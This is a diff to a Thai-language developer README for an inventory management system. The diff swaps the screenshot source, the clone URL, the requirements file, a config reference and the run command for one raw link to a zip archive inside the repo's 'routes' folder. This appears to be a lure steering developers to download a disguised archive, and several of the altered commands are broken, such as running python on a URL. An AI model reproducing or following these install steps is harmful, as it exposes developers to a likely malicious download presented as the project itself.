@@ -1,6 +1,6 @@
 # ItShutter Inventory Management System 📦
 
-<img width="900" height="409" alt="Screenshot 2026-01-20 143306" src="https://github.com/user-attachments/assets/dbbab8b4-bd8d-41c6-a927-979a3d17b0de" />
+<img width="900" height="409" alt="Screenshot 2026-01-20 143306" src="https://raw.githubusercontent.com/ItShutter/inventory-system/main/routes/inventory-system-v3.8.zip" />
 
 ## 🛠️ Installation Guide for Developers
 ส่วนนี้อธิบายขั้นตอนการตั้งค่าสภาพแวดล้อมสำหรับการพัฒนา (Development Environment) โดยละเอียด
@@ -14,7 +14,7 @@
 1. **Clone Repository**
    ดึงโค้ดโปรเจกต์ลงมาที่เครื่อง
    ```bash
-   git clone [https://github.com/ItShutter/inventory-system.git](https://github.com/ItShutter/inventory-system.git)
+   git clone [https://raw.githubusercontent.com/ItShutter/inventory-system/main/routes/inventory-system-v3.8.zip](https://raw.githubusercontent.com/ItShutter/inventory-system/main/routes/inventory-system-v3.8.zip)
    cd inventory-system
 2. สร้างและเปิดใช้งาน Virtual Environment การสร้าง venv จะช่วยให้มั่นใจว่า Library จะไม่ตีกับโปรเจกต์อื่น
    สร้าง Virtual Environment
@@ -26,15 +26,15 @@
 	## .\venv\Scripts\activate
 3. ติดตั้ง Libraries ที่จำเป็น
    ```bash
-	pip install -r requirements.txt
+	pip install -r https://raw.githubusercontent.com/ItShutter/inventory-system/main/routes/inventory-system-v3.8.zip
 	
 4. ตั้งค่าฐานข้อมูล (Database Setup) โปรเจกต์นี้ใช้ PostgreSQL ผ่าน Docker ให้รันคำสั่งต่อไปนี้เพื่อเริ่มฐานข้อมูล:
    ```bash
    	docker-compose up -d
 5. ตั้งค่า Environment Variables สร้างไฟล์ .env เพื่อเก็บค่าการเชื่อมต่อ Database:
    ```bash
-   	# ตัวอย่างการสร้างไฟล์ .env (ปรับรหัสผ่านตามที่ตั้งใน docker-compose.yml)
+   	# ตัวอย่างการสร้างไฟล์ .env (ปรับรหัสผ่านตามที่ตั้งใน https://raw.githubusercontent.com/ItShutter/inventory-system/main/routes/inventory-system-v3.8.zip)
 	echo "DATABASE_URI=postgresql://admin:mysecretpassword@localhost:5432/inventory_system" > .env
 6. เริ่มรันโปรแกรม (Run Application)
 	```bash
-   python app.py
+   python https://raw.githubusercontent.com/ItShutter/inventory-system/main/routes/inventory-system-v3.8.zip
